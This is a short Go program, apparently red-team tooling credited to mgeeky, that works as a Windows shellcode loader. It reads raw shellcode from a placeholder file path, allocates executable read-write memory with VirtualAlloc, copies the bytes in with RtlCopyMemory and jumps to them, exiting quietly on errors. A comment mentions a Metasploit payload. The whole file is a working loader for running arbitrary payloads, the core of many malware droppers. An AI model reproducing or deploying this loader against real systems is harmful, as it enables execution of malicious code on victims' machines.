
// Compilation:
//      $ go build -o foo.exe shellcodeLoader.go
//
// Mariusz B. / mgeeky (@mariuszbit), '20 
// <mb@binary-offensive.com>
//

package main

import (
   
	"fmt"
	
	"syscall"
	"io/ioutil"
	"unsafe"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")

    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {

    //
    // simple x64 Metasploit payload launching notepad.exe
    
    shellcode := read("REPLACE_FILE")

    addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    if err != nil && err.Error() != "The operation completed successfully." {syscall.Exit(0)}

    _, _, err = RtlCopyMemory.Call( addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
     if err != nil && err.Error() != "The operation completed successfully." {
        syscall.Exit(0)
    }
    // jump to shellcode
    syscall.Syscall(addr, 0, 0, 0, 0)
}
func read(file string) []byte {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Print(err)
	}
	return data
}

